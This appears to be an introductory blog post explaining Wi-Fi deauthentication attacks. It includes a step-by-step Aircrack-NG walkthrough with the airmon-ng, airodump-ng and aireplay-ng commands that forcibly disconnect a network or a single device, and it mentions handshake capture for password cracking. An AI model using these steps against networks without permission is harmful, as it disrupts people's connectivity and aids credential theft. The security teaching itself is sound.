Understanding Wi-Fi Deauthentication with Aircrack-NG
Harsh Mehta, #OPEN_TO_WORK
Harsh Mehta
GSoC 2026 | Former Intern @Tech Mahindra | Pentathon’25 Finalist


March 18, 2025


Introduction
Ever wondered how Wi-Fi networks can be forcibly disconnected? Meet deauthentication (deauth) attacks, a technique often used in penetration testing to assess wireless security. Using Aircrack-NG, we can simulate these attacks and understand how they work.

Disclaimer: This is for educational purposes only. Unauthorized attacks on networks you don’t own or have explicit permission to test are illegal.

What is a Deauthentication Attack?
Wi-Fi networks use management frames (like authentication and deauthentication frames) to maintain connections. These frames aren’t encrypted in standard WPA2/WPA3 networks (unless PMF is enabled), making them vulnerable to spoofing.

A deauth attack works by sending spoofed deauth frames to a target device, forcing it to disconnect from the network.

Why is this useful?
Testing network security 
Capturing WPA2 handshakes for password cracking
Disrupting unauthorized devices on your own network

🛠 Tools Used & the Vulnerability We Exploit
In our deauthentication attack, we leveraged Aircrack-NG, a powerful suite for Wi-Fi penetration testing, specifically using 

Airmon-NG
Airodump-NG 
Aireplay-NG

These tools allow us to put a Wi-Fi adapter into monitor mode, scan for networks, and inject deauthentication frames. 

The fundamental weakness being exploited is that management frames in Wi-Fi (like deauth and disassociation frames) are unprotected by default, even in WPA2/WPA3 networks (unless 802.11w PMF is enabled). Since these frames lack authentication and encryption, attackers can spoof them to force devices to disconnect from an access point (AP).



Article content
Structure of a deauth frame
Article content
Performing a Deauth Attack with Aircrack-NG
Step 1: Enable Monitor Mode
First, check your wireless interface: 

iwconfig
Put your Wi-Fi adapter into monitor mode: 

airmon-ng start wlan0


Step 2: Identify the Target
List all nearby networks: 

airodump-ng wlan0mon
Find the BSSID (MAC address) of the target Wi-Fi network and its channel.



Step 3: Start a Deauth Attack
To disconnect all devices from a specific network:

 aireplay-ng -0 100 -a <BSSID> wlan0mon
-0 100: Send 100 deauth packets
-a <BSSID>: Target network MAC address
wlan0mon: Monitor mode interface



To deauth a specific device

aireplay-ng -0 100 -a <BSSID> -c <CLIENT_MAC> wlan0mon
That's literally it! You just jammed a (2.4ghz mostly) network :)

Most consumer Wi-Fi adapters lack support for 5GHz packet injection, making deauth attacks ineffective on 5GHz networks. If your attack isn't working, this is likely the reason.



To conclude

Deauthentication attacks expose critical flaws in Wi-Fi security and highlight the need for stronger encryption and defenses. If you manage networks, testing for such vulnerabilities is essential to harden your Wi-Fi security.

This is my first post! Let me know if you found this helpful and what topics you’d like to see next.